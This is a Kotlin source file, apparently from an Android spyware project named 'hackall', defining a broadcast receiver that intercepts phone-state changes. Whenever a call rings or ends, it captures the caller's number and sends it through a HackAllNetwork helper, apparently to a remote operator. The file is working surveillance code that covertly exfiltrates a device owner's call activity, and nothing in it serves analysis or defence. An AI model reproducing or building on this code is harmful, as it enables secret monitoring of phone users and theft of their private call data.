package cocomelonc.hackall.broadcasts
import cocomelonc.hackall.tools.HackAllNetwork
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.telephony.TelephonyManager

class HackAllCallReceiver: BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == TelephonyManager.ACTION_PHONE_STATE_CHANGED) {
            val incomingCallNumber = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER)
            if (incomingCallNumber != null) {
                if (intent.getStringExtra(TelephonyManager.EXTRA_STATE) == TelephonyManager.EXTRA_STATE_RINGING) {
                    HackAllNetwork(context).sendTextMessage("\uD83D\uDCF1 New Call ringing: $incomingCallNumber")
                }
                if (intent.getStringExtra(TelephonyManager.EXTRA_STATE) == TelephonyManager.EXTRA_STATE_IDLE ||
                    intent.getStringExtra(TelephonyManager.EXTRA_STATE) == TelephonyManager.EXTRA_STATE_OFFHOOK) {
                    HackAllNetwork(context).sendTextMessage("\uD83D\uDCF1 New Call ended: $incomingCallNumber")
                }
            }
        }
    }
}